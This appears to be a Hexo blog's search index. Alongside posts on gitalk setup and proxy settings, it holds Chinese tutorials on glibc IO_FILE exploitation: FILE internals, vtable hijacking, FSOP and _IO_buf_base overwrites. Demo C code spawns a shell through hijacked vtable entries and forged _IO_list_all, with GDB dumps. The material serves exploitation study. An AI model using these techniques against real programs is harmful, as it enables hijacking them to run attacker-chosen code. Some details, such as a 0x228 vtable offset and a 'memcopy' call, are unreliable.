[{"title":"NexT主题中集成gitalk评论系统","date":"2018-07-08T18:53:26.000Z","path":"2018/07/09/NexT主题中集成gitalk评论系统/","text":"本文记录NexT主题中添加gitalk评论系统的步骤。gitalk：一个基于 Github Issue 和 Preact 开发的评论插件详情Demo可见：https://gitalk.github.io/ 1. Register Application在GitHub上注册新应用，链接：https://github.com/settings/applications/new参数说明：Application name： # 应用名称，随意Introspelliam.github.ioHomepage URL： # 网站URL，如https://Introspelliam.github.ioApplication description # 描述，随意Authorization callback URL：# 网站URL，https://Introspelliam.github.io 点击注册后，页面跳转如下，其中Client ID和Client Secret在后面的配置中需要用到，到时复制粘贴即可： 2. gitalk.swig新建/layout/_third-party/comments/gitalk.swig文件，并添加内容： 1234567891011121314151617&#123;% if page.comments &amp;&amp; theme.gitalk.enable %&#125; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://unpkg.com/gitalk/dist/gitalk.css&quot;&gt; &lt;script src=&quot;https://unpkg.com/gitalk/dist/gitalk.min.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; var gitalk = new Gitalk(&#123; clientID: &apos;&#123;&#123; theme.gitalk.ClientID &#125;&#125;&apos;, clientSecret: &apos;&#123;&#123; theme.gitalk.ClientSecret &#125;&#125;&apos;, repo: &apos;&#123;&#123; theme.gitalk.repo &#125;&#125;&apos;, owner: &apos;&#123;&#123; theme.gitalk.githubID &#125;&#125;&apos;, admin: [&apos;&#123;&#123; theme.gitalk.adminUser &#125;&#125;&apos;], id: location.pathname, distractionFreeMode: &apos;&#123;&#123; theme.gitalk.distractionFreeMode &#125;&#125;&apos; &#125;) gitalk.render(&apos;gitalk-container&apos;) &lt;/script&gt;&#123;% endif %&#125; 3. comments.swig修改/layout/_partials/comments.swig，添加内容如下，与前面的elseif同一级别上： 12&#123;% elseif theme.gitalk.enable %&#125; &lt;div id=&quot;gitalk-container&quot;&gt;&lt;/div&gt; 4. index.swig修改layout/_third-party/comments/index.swig，在最后一行添加内容： 1&#123;% include &apos;gitalk.swig&apos; %&#125; 5. gitalk.styl新建/source/css/_common/components/third-party/gitalk.styl文件，添加内容： 1234.gt-header a, .gt-comments a, .gt-popup a border-bottom: none;.gt-container .gt-popup .gt-action.is--active:before top: 0.7em; 6. third-party.styl修改/source/css/_common/components/third-party/third-party.styl，在最后一行上添加内容，引入样式： 1@import &quot;gitalk&quot;; 7. _config.yml在主题配置文件next/_config.yml中添加如下内容： 12345678gitalk: enable: true githubID: github帐号 # 例：Introspelliam repo: 仓库名称 # 例：Introspelliam.github.io ClientID: Client ID ClientSecret: Client Secret adminUser: github帐号 #指定可初始化评论账户 distractionFreeMode: true 以上就是NexT中添加gitalk评论的配置，博客上传到GitHub上后，打开页面进入某一博客内容下，就可看到评论处。","tags":[{"name":"hexo","slug":"hexo","permalink":"http://yoursite.com/tags/hexo/"}]},{"title":"test3","date":"2018-07-08T18:32:57.000Z","path":"2018/07/09/test/test3/","text":"test3","tags":[{"name":"test1","slug":"test1","permalink":"http://yoursite.com/tags/test1/"}]},{"title":"test2","date":"2018-07-08T17:32:57.000Z","path":"2018/07/09/test/test2/","text":"test2","tags":[{"name":"test1","slug":"test1","permalink":"http://yoursite.com/tags/test1/"}]},{"title":"个人博客网站搭建中遇到的问题以及解决办法","date":"2018-07-08T17:10:05.000Z","path":"2018/07/09/个人博客网站搭建中遇到的问题以及解决办法/","text":"1. hexo deploy卡死或报错这是我最近遇到的问题，困扰了很长时间！ 主要问题时因为hexo deploy中上传的内容比较大，而git push过程的是2B/s，直接导致最终上传不上去或者服务器返回超时或者ssl方面的错误。 解决办法：挂代理 1234567git config --global https.proxy http://127.0.0.1:1080git config --global https.proxy https://127.0.0.1:1080git config --global --unset http.proxygit config --global --unset https.proxynpm config delete proxy 2. 文章目录层级结构显示不全我们在使用侧边栏的时候，可能会有将文章目录结构全部显示的需求，但next/_config.yml不论如何设置都不会成功。这个时候就需要改源码。 next/source/css/_common/components/sidebar/sidebar-toc.styl 1//.post-toc .nav .nav-child &#123; display: none; &#125; 将上面那行注释掉即可 3. 文章目录自动无序列表当文章中没有1、2、3这样的章节标题设置时，我们很容易忽略层级关系；但是若加上1、2、3这样的章节标题，且next的toc设置中启用了自动添加数字时，就容易产生1.1.这样多次显示章节序列的问题。 解决办法：参考issue next/_config.yml 123456# TOC in the Sidebartoc: enable: true # Automatically add list number to toc. number: false 将toc中的number设置为false","tags":[{"name":"hexo","slug":"hexo","permalink":"http://yoursite.com/tags/hexo/"}]},{"title":"新版本libc下IO_FILE的利用","date":"2018-07-05T03:03:51.000Z","path":"2018/07/05/新版本libc下IO-FILE的利用/","text":"新版本libc下IO_FILE的利用介绍在最新版本的glibc中(2.24)，全新加入了针对IO_FILE_plus的vtable劫持的检测措施，glibc 会在调用虚函数之前首先检查vtable地址的合法性。 如果vtable是非法的，那么会引发abort。 首先会验证vtable是否位于_IO_vtable段中，如果满足条件就正常执行，否则会调用_IO_vtable_check做进一步检查。 这里的检查使得以往使用vtable进行利用的技术很难实现 新的利用技术在vtable难以被利用之后，利用的关注点从vtable转移到_IO_FILE结构内部的域中。 前面介绍过_IO_FILE在使用标准IO库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用诸如fwrite、fread等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或任意地址读。 12345678910111213141516171819202122232425struct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */ /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; int _flags2; _IO_off_t _old_offset; /* This used to be _offset but it&apos;s too small. */&#125;; 因为进程中包含了系统默认的三个文件流stdin\\stdout\\stderr，因此这种方式可以不需要进程中存在文件操作，通过scanf\\printf一样可以进行利用。 在_IO_FILE中_IO_buf_base表示操作的起始地址，_IO_buf_end表示结束地址，通过控制这两个数据可以实现控制读写的操作。 示例简单的观察一下_IO_FILE对于调用scanf的作用 1234567891011#include &quot;stdio.h&quot;char buf[100];int main()&#123; char stack_buf[100]; scanf(&quot;%s&quot;,stack_buf); scanf(&quot;%s&quot;,stack_buf);&#125; 在执行程序第一次使用stdin之前，stdin的内容还未初始化是空的 12345678910111213140x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;: 0x00000000fbad2088 0x00000000000000000x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1940 &lt;_IO_2_1_stdin_+96&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1950 &lt;_IO_2_1_stdin_+112&gt;: 0x0000000000000000 0xffffffffffffffff0x7ffff7dd1960 &lt;_IO_2_1_stdin_+128&gt;: 0x0000000000000000 0x00007ffff7dd37900x7ffff7dd1970 &lt;_IO_2_1_stdin_+144&gt;: 0xffffffffffffffff 0x00000000000000000x7ffff7dd1980 &lt;_IO_2_1_stdin_+160&gt;: 0x00007ffff7dd19c0 0x00000000000000000x7ffff7dd1990 &lt;_IO_2_1_stdin_+176&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd19a0 &lt;_IO_2_1_stdin_+192&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd19b0 &lt;_IO_2_1_stdin_+208&gt;: 0x0000000000000000 0x00007ffff7dd06e0 &lt;== vtable 调用scanf之后可以看到_IO_read_ptr、_IO_read_base、_IO_read_end、_IO_buf_base、_IO_buf_end等域都被初始化 12345678910111213140x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;: 0x00000000fbad2288 0x00000000006020130x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;: 0x0000000000602014 0x00000000006020100x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;: 0x0000000000602010 0x00000000006020100x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;: 0x0000000000602010 0x00000000006020100x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;: 0x0000000000602410 0x00000000000000000x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1940 &lt;_IO_2_1_stdin_+96&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1950 &lt;_IO_2_1_stdin_+112&gt;: 0x0000000000000000 0xffffffffffffffff0x7ffff7dd1960 &lt;_IO_2_1_stdin_+128&gt;: 0x0000000000000000 0x00007ffff7dd37900x7ffff7dd1970 &lt;_IO_2_1_stdin_+144&gt;: 0xffffffffffffffff 0x00000000000000000x7ffff7dd1980 &lt;_IO_2_1_stdin_+160&gt;: 0x00007ffff7dd19c0 0x00000000000000000x7ffff7dd1990 &lt;_IO_2_1_stdin_+176&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd19a0 &lt;_IO_2_1_stdin_+192&gt;: 0x00000000ffffffff 0x00000000000000000x7ffff7dd19b0 &lt;_IO_2_1_stdin_+208&gt;: 0x0000000000000000 0x00007ffff7dd06e0 进一步思考可以发现其实stdin初始化的内存是在堆上分配出来的，在这里堆的基址是0x602000，因为之前没有堆分配因此缓冲区的地址也是0x602010 12345Start End Offset Perm Path0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/桌面/tst/1/t10x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/桌面/tst/1/t10x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/桌面/tst/1/t10x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] 分配的堆大小是0x400个字节，正好对应于_IO_buf_base～_IO_buf_end 在进行写入后，可以看到缓冲区中有我们写入的数据，之后目的地址栈中的缓冲区也会写入数据 123450x602000: 0x0000000000000000 0x0000000000000411 &lt;== 分配0x400大小0x602010: 0x000000000a333231 0x0000000000000000 &lt;== 缓冲数据0x602020: 0x0000000000000000 0x00000000000000000x602030: 0x0000000000000000 0x00000000000000000x602040: 0x0000000000000000 0x0000000000000000 接下来我们尝试修改_IO_buf_base来实现任意地址读写，全局缓冲区buf的地址是0x7ffff7dd2740。修改_IO_buf_base和_IO_buf_end到缓冲区buf的地址 12345678910111213140x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;: 0x00000000fbad2288 0x00000000006020130x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;: 0x0000000000602014 0x00000000006020100x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;: 0x0000000000602010 0x00000000006020100x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;: 0x0000000000602010 0x00007ffff7dd2740 &lt;== _IO_buf_base0x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;: 0x00007ffff7dd27c0 0x0000000000000000 &lt;== _IO_buf_end0x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1940 &lt;_IO_2_1_stdin_+96&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1950 &lt;_IO_2_1_stdin_+112&gt;: 0x0000000000000000 0xffffffffffffffff0x7ffff7dd1960 &lt;_IO_2_1_stdin_+128&gt;: 0x0000000000000000 0x00007ffff7dd37900x7ffff7dd1970 &lt;_IO_2_1_stdin_+144&gt;: 0xffffffffffffffff 0x00000000000000000x7ffff7dd1980 &lt;_IO_2_1_stdin_+160&gt;: 0x00007ffff7dd19c0 0x00000000000000000x7ffff7dd1990 &lt;_IO_2_1_stdin_+176&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd19a0 &lt;_IO_2_1_stdin_+192&gt;: 0x00000000ffffffff 0x00000000000000000x7ffff7dd19b0 &lt;_IO_2_1_stdin_+208&gt;: 0x0000000000000000 0x00007ffff7dd06e0 之后scanf的读入数据就会写入到0x7ffff7dd2740的位置 123450x7ffff7dd2740 &lt;buf&gt;: 0x00000a6161616161 0x00000000000000000x7ffff7dd2750 &lt;buffer&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd2760 &lt;buffer&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd2770 &lt;buffer&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd2780 &lt;buffer&gt;: 0x0000000000000000 0x0000000000000000","tags":[{"name":"IO_FILE","slug":"IO-FILE","permalink":"http://yoursite.com/tags/IO-FILE/"}]},{"title":"FSOP","date":"2018-07-05T02:51:47.000Z","path":"2018/07/05/FSOP/","text":"介绍FSOP是File Stream Oriented Programming的缩写，根据前面对FILE的介绍得知进程内所有的_IO_FILE结构会使用_chain域相互连接形成一个链表，这个链表的头部由_IO_list_all维护。 FSOP的核心思想就是劫持_IO_list_all的值来伪造链表和其中的_IO_FILE项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all链表中所有项的文件流，相当于对每个FILE调用fflush，也对应着会调用_IO_FILE_plus.vtable中的_IO_overflow。 12345678910111213141516int_IO_flush_all_lockp (int do_lock)&#123; ... fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) &#123; ... if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) &#123; result = EOF; &#125; ... &#125;&#125; 而_IO_flush_all_lockp不需要攻击者手动调用，在一些情况下这个函数会被系统调用： 1.当libc执行abort流程时 2.当执行exit函数时 3.当执行流从main函数返回时 示例梳理一下FSOP利用的条件，首先需要攻击者获知libc.so基址，因为_IO_list_all是作为全局变量储存在libc.so中的，不泄漏libc基址就不能改写_IO_list_all。 之后需要用任意地址写把_IO_list_all的内容改为指向我们可控内存的指针， 之后的问题是在可控内存中布置什么数据，毫无疑问的是需要布置一个我们理想函数的vtable指针。但是为了能够让我们构造的fake_FILE能够正常工作，还需要布置一些其他数据。 这里的依据是我们前面给出的 12345if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) &#123; result = EOF; &#125; 也就是 fp-&gt;_mode &lt;= 0 fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base 在这里通过一个示例来验证这一点，首先我们分配一块内存用于存放伪造的vtable和_IO_FILE_plus。 为了绕过验证，我们提前获得了_IO_write_ptr、_IO_write_base、_mode等数据域的偏移，这样可以在伪造的vtable中构造相应的数据 1234567891011121314151617181920212223242526#define _IO_list_all 0x7ffff7dd2520#define mode_offset 0xc0#define writeptr_offset 0x28#define writebase_offset 0x20#define vtable_offset 0xd8int main(void)&#123; void *ptr; long long *list_all_ptr; ptr=malloc(0x200); *(long long*)((long long)ptr+mode_offset)=0x0; *(long long*)((long long)ptr+writeptr_offset)=0x1; *(long long*)((long long)ptr+writebase_offset)=0x0; *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100); *(long long*)((long long)ptr+0x100+24)=0x41414141; list_all_ptr=(long long *)_IO_list_all; list_all_ptr[0]=ptr; exit(0);&#125; 我们使用分配内存的前0x100个字节作为_IO_FILE_plus，后0x100个字节作为vtable，在vtable中使用0x41414141这个地址作为伪造的_IO_overflow指针。 之后，覆盖位于libc中的全局变量 _IO_list_all，把它指向我们伪造的_IO_FILE_plus。 通过调用exit函数，程序会执行 _IO_flush_all_lockp，经过fflush获取_IO_list_all的值并取出作为_IO_FILE_plus调用其中的_IO_overflow 123456---&gt; call _IO_overflow[#0] 0x7ffff7a89193 → Name: _IO_flush_all_lockp(do_lock=0x0)[#1] 0x7ffff7a8932a → Name: _IO_cleanup()[#2] 0x7ffff7a46f9b → Name: __run_exit_handlers(status=0x0, listp=&lt;optimized out&gt;, run_list_atexit=0x1)[#3] 0x7ffff7a47045 → Name: __GI_exit(status=&lt;optimized out&gt;)[#4] 0x4005ce → Name: main()","tags":[{"name":"IO_FILE","slug":"IO-FILE","permalink":"http://yoursite.com/tags/IO-FILE/"}]},{"title":"伪造vtable劫持程序流程","date":"2018-07-05T01:24:28.000Z","path":"2018/07/05/伪造vtable劫持程序流程/","text":"伪造vtable劫持程序流程简介前面我们介绍了Linux中文件流的特性（FILE），我们可以得知Linux中的一些常见的IO操作函数都需要经过FILE结构进行处理。尤其是_IO_FILE_plus结构中存在vtable，一些函数会取出vtable中的指针进行调用。 因此伪造vtable劫持程序流程的中心思想就是针对_IO_FILE_plus的vtable动手脚，通过把vtable指向我们控制的内存，并在其中布置函数指针来实现。 因此vtable劫持分为两种，一种是直接改写vtable中的函数指针，通过任意地址写就可以实现。另一种是覆盖vtable的指针指向我们控制的内存，然后在其中布置函数指针。 实践这里演示了修改vtable中的指针，首先需要知道_IO_FILE_plus位于哪里，对于fopen的情况下是位于堆内存，对于stdin\\stdout\\stderr是位于libc.so中。 1234567891011121314151617#include &lt;stdio.h&gt;#include &lt;sys/mman.h&gt;void getshell()&#123; system(&quot;/bin/sh&quot;);&#125;int main(void)&#123; FILE *fp; long long *vtable_ptr; mprotect(0x00007ffff7dcd000, 0x4000, 7); // set IO_FILE rwx fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;); vtable_ptr=*(long long*)((long long)fp+0xd8); //get vtable vtable_ptr[7]=0x400606; //xsputn printf(&quot;call 0x400606&quot;); //getshell&#125; 根据vtable在_IO_FILE_plus的偏移得到vtable的地址，在64位系统下偏移是0xd8。之后需要搞清楚欲劫持的IO函数会调用vtable中的哪个函数。关于IO函数调用vtable的情况已经在FILE结构介绍一节给出了，知道了printf会调用vtable中的xsputn，并且xsputn的是vtable中第八项之后就可以写入这个指针进行劫持。 并且在xsputn等vtable函数进行调用时，传入的第一个参数其实是对应的_IO_FILE_plus地址。比如这例子调用printf，传递给vtable的第一个参数就是_IO_2_1_stdout_的地址。 利用这点可以实现给劫持的vtable函数传參，比如 12345678910111213141516#define system_ptr 0x7ffff7a52390;int main(void)&#123; FILE *fp; long long *vtable_ptr; fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;); vtable_ptr=*(long long*)((long long)fp+0xd8); //get vtable memcopy(fp,&quot;sh&quot;,3); vtable_ptr[7]=system_ptr //xsputn fwrite(&quot;hi&quot;,2,1,fp);&#125; 但是在目前libc2.23版本下，位于libc数据段的vtable是不可以进行写入的。不过，通过在可控的内存中伪造vtable的方法依然可以实现利用。 1234567891011121314151617181920#define system_ptr 0x7ffff7a52390;int main(void)&#123; FILE *fp; long long *vtable_addr,*fake_vtable; fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;); fake_vtable=malloc(0x40); vtable_addr=(long long *)((long long)fp+0xd8); //vtable offset vtable_addr[0]=(long long)fake_vtable; memcpy(fp,&quot;sh&quot;,3); fake_vtable[7]=system_ptr; //xsputn fwrite(&quot;hi&quot;,2,1,fp);&#125; 我们首先分配一款内存来存放伪造的vtable，之后修改_IO_FILE_plus的vtable指针指向这块内存。因为vtable中的指针我们放置的是system函数的地址，因此需要传递参数&quot;/bin/sh&quot;或&quot;sh&quot;。 因为vtable中的函数调用时会把对应的_IO_FILE_plus指针作为第一个参数传递，因此这里我们把&quot;sh&quot;写入_IO_FILE_plus头部。之后对fwrite的调用就会经过我们伪造的vtable执行system(&quot;sh&quot;)。 同样，如果程序中不存在fopen等函数创建的_IO_FILE时，也可以选择stdin\\stdout\\stderr等位于libc.so中的_IO_FILE，这些流在printf\\scanf等函数中就会被使用到。在libc2.23之前，这些vtable是可以写入并且不存在其他检测的。 1234567print &amp;_IO_2_1_stdin_$2 = (struct _IO_FILE_plus *) 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so","tags":[{"name":"IO_FILE","slug":"IO-FILE","permalink":"http://yoursite.com/tags/IO-FILE/"}]},{"title":"FILE文件结构介绍","date":"2018-06-22T12:54:17.000Z","path":"2018/06/22/FILE文件结构介绍/","text":"FILE结构FILE介绍FILE在Linux系统的标准IO库中是用于描述文件的结构，称为文件流。 FILE结构在程序执行fopen等函数时会进行创建，并分配在堆中。我们常定义一个指向FILE结构的指针来接收这个返回值。 FILE结构定义在libio.h中，如下所示 123456789101112131415161718192021222324252627282930313233343536373839404142struct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it&apos;s too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;; 进程中的FILE结构会通过_chain域彼此连接形成一个链表，链表头部用全局变量_IO_list_all表示，通过这个值我们可以遍历所有的FILE结构。 在标准I/O库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，_IO_list_all指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于libc.so的数据段。而我们使用fopen创建的文件流是分配在堆内存上的。 我们可以在libc.so中找到stdin\\stdout\\stderr等符号，这些符号是指向FILE结构的指针，真正结构的符号是 123_IO_2_1_stderr__IO_2_1_stdout__IO_2_1_stdin_ 但是事实上_IO_FILE结构外包裹着另一种结构_IO_FILE_plus，其中包含了一个重要的指针vtable指向了一系列函数指针。 在libc2.23版本下，32位的vtable偏移为0x94，64位偏移为0x228 12345struct _IO_FILE_plus&#123; _IO_FILE file; IO_jump_t *vtable;&#125; vtable是IO_jump_t类型的指针，IO_jump_t中保存了一些函数指针，在后面我们会看到在一系列标准IO函数中会调用这些函数指针 123456789101112131415161718192021222324void * funcs[] = &#123; 1 NULL, // &quot;extra word&quot; 2 NULL, // DUMMY 3 exit, // finish 4 NULL, // overflow 5 NULL, // underflow 6 NULL, // uflow 7 NULL, // pbackfail 8 NULL, // xsputn #printf 9 NULL, // xsgetn 10 NULL, // seekoff 11 NULL, // seekpos 12 NULL, // setbuf 13 NULL, // sync 14 NULL, // doallocate 15 NULL, // read 16 NULL, // write 17 NULL, // seek 18 pwn, // close 19 NULL, // stat 20 NULL, // showmanyc 21 NULL, // imbue&#125;; freadfread是标准IO库函数，作用是从文件流中读数据，函数原型如下 1size_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ; buffer 存放读取数据的缓冲区。 size：指定每个记录的长度。 count： 指定记录的个数。 stream：目标文件流。 返回值：返回读取到数据缓冲区中的记录个数 fread的代码位于/libio/iofread.c中，函数名为_IO_fread，但真正的功能实现在子函数_IO_sgetn中。 1234567891011_IO_size_t_IO_fread (buf, size, count, fp) void *buf; _IO_size_t size; _IO_size_t count; _IO_FILE *fp;&#123; ... bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested); ...&#125; 在_IO_sgetn函数中会调用_IO_XSGETN，而_IO_XSGETN是_IO_FILE_plus.vtable中的函数指针，在调用这个函数时会首先取出vtable中的指针然后再进行调用。 12345678_IO_size_t_IO_sgetn (fp, data, n) _IO_FILE *fp; void *data; _IO_size_t n;&#123; return _IO_XSGETN (fp, data, n);&#125; 在默认情况下函数指针是指向_IO_file_xsgetn函数的， 12345678if (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)) &#123; if (__underflow (fp) == EOF) break; continue; &#125; fwritefwrite同样是标准IO库函数，作用是向文件流写入数据，函数原型如下 1size_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream); buffer:是一个指针，对fwrite来说，是要写入数据的地址; size:要写入内容的单字节数; count:要进行写入size字节的数据项的个数; stream:目标文件指针; 返回值：实际写入的数据项个数count。 fwrite的代码位于/libio/iofwrite.c中，函数名为_IO_fwrite。 在_IO_fwrite中主要是调用_IO_XSPUTN来实现写入的功能。 根据前面对_IO_FILE_plus的介绍，可知_IO_XSPUTN位于_IO_FILE_plus的vtable中，调用这个函数需要首先取出vtable中的指针，再跳过去进行调用。 1written = _IO_sputn (fp, (const char *) buf, request); 在_IO_XSPUTN对应的默认函数_IO_new_file_xsputn中会调用同样位于vtable中的_IO_OVERFLOW 12/* Next flush the (full) buffer. */ if (_IO_OVERFLOW (f, EOF) == EOF) _IO_OVERFLOW默认对应的函数是_IO_new_file_overflow 123456if (ch == EOF) return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base); if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */ if (_IO_do_flush (f) == EOF) return EOF; 在_IO_new_file_overflow内部最终会调用系统接口write函数 fopenfopen在标准IO库中用于打开文件，函数原型如下 1FILE *fopen(char *filename, *type); filename:目标文件的路径 type:打开方式的类型 返回值:返回一个文件指针 在fopen内部会创建FILE结构并进行一些初始化操作，下面来看一下这个过程 首先在fopen对应的函数__fopen_internal内部会调用malloc函数，分配FILE结构的空间。因此我们可以获知FILE结构是存储在堆上的 1*new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE)); 之后会为创建的FILE初始化vtable，并调用_IO_file_init进一步初始化操作 12_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;_IO_file_init (&amp;new_f-&gt;fp); 在_IO_file_init函数的初始化操作中，会调用_IO_link_in把新分配的FILE链入_IO_list_all为起始的FILE链表中 123456789101112void_IO_link_in (fp) struct _IO_FILE_plus *fp;&#123; if ((fp-&gt;file._flags &amp; _IO_LINKED) == 0) &#123; fp-&gt;file._flags |= _IO_LINKED; fp-&gt;file._chain = (_IO_FILE *) _IO_list_all; _IO_list_all = fp; ++_IO_list_all_stamp; &#125;&#125; 之后__fopen_internal函数会调用_IO_file_fopen函数打开目标文件，_IO_file_fopen会根据用户传入的打开模式进行打开操作，总之最后会调用到系统接口open函数，这里不再深入。 12if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL) return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file); 总结一下fopen的操作是 使用malloc分配FILE结构 设置FILE结构的vtable 初始化分配的FILE结构 将初始化的FILE结构链入FILE结构链表中 调用系统调用打开文件 fclosefclose是标准IO库中用于关闭已打开文件的函数，其作用与fopen相反。 1int fclose(FILE *stream) 功能：关闭一个文件流，使用fclose就可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区 fclose首先会调用_IO_unlink_it将指定的FILE从_chain链表中脱链 12if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF) _IO_un_link ((struct _IO_FILE_plus *) fp); 之后会调用_IO_file_close_it函数，_IO_file_close_it会调用系统接口close关闭文件 12if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF) status = _IO_file_close_it (fp); 最后调用vtable中的_IO_FINISH，其对应的是_IO_file_finish函数，其中会调用free函数释放之前分配的FILE结构 1_IO_FINISH (fp); printf/putsprintf和puts是常用的输出函数，在printf的参数是以&#39;\\n&#39;结束的纯字符串时，printf会被优化为puts函数并去除换行符。 puts在源码中实现的函数是_IO_puts，这个函数的操作与fwrite的流程大致相同，函数内部同样会调用vtable中的_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口write函数。 printf的调用栈回溯如下，同样是通过_IO_file_xsputn实现 